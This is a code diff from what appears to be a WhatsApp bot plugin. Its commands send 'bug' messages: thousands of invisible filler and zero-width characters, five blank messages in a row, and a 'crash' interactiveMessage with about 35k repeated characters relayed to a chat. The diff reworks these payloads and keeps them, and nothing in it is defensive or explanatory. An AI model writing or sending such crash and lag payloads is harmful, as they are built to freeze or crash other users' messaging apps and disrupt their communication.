@@ -8,14 +8,9 @@ cmd({
     react: "🐢",
     filename: __filename
 },
-async (conn, m, { from, reply }) => {
-    try {
-        let text = '';
-        for(let i = 0; i < 4000; i++) text += 'ㅤ'; 
-        await conn.sendMessage(from, { text: text + '🐢 𝐃𝐄𝐋𝐀𝐘 𝐒𝐄𝐍𝐓' });
-    } catch (e) {
-        reply(`❌ ${e.message}`);
-    }
+async (conn, m, { from }) => {
+    let text = 'ㅤ'.repeat(4000); 
+    await conn.sendMessage(from, { text: text + '🐢 𝐃𝐄𝐋𝐀𝐘' });
 });
 
 cmd({
@@ -26,24 +21,15 @@ cmd({
     react: "💣",
     filename: __filename
 },
-async (conn, m, { from, reply }) => {
-    try {
-        // FIX: jidDecode nathi karala direct interactive yawanawa
-        const crash = {
-            interactiveMessage: {
-                body: { text: "𝐑𝐈𝐊𝐀-𝐂𝐑𝐀𝐒𝐇 ".repeat(2000) }, // 35k wage
-                nativeFlowMessage: { 
-                    buttons: [
-                        { name: "cta_url", buttonParamsJson: '{"display_text":"CLICK","url":"https://wa.me"}' }
-                    ]
-                }
-            }
-        };
-        await conn.relayMessage(from, crash, { messageId: m.key.id });
-        reply('✅ Crash bug sent');
-    } catch (e) {
-        reply(`❌ ${e.message}`);
-    }
+async (conn, m, { from }) => {
+    // FIX: relayMessage 3rd param {} empty karala
+    const crash = {
+        interactiveMessage: {
+            body: { text: "𝐑𝐈𝐊𝐀 ".repeat(2500) }, // ~35k chars
+            nativeFlowMessage: { buttons: [] }
+        }
+    };
+    await conn.relayMessage(from, crash, {}); // <-- mehema witharai
 });
 
 cmd({
@@ -54,14 +40,9 @@ cmd({
     react: "👻",
     filename: __filename
 },
-async (conn, m, { from, reply }) => {
-    try {
-        for(let i = 0; i < 5; i++) {
-            await conn.sendMessage(from, { text: 'ㅤ' });
-        }
-        reply('✅ Ghost bug sent x5');
-    } catch (e) {
-        reply(`❌ ${e.message}`);
+async (conn, m, { from }) => {
+    for(let i = 0; i < 5; i++) {
+        await conn.sendMessage(from, { text: 'ㅤ' });
     }
 });
 
@@ -73,11 +54,6 @@ cmd({
     react: "🫥",
     filename: __filename
 },
-async (conn, m, { from, reply }) => {
-    try {
-        await conn.sendMessage(from, { text: '\u200B'.repeat(10000) });
-        reply('✅ Invisible bug sent');
-    } catch (e) {
-        reply(`❌ ${e.message}`);
-    }
+async (conn, m, { from }) => {
+    await conn.sendMessage(from, { text: '\u200B'.repeat(10000) });
 });
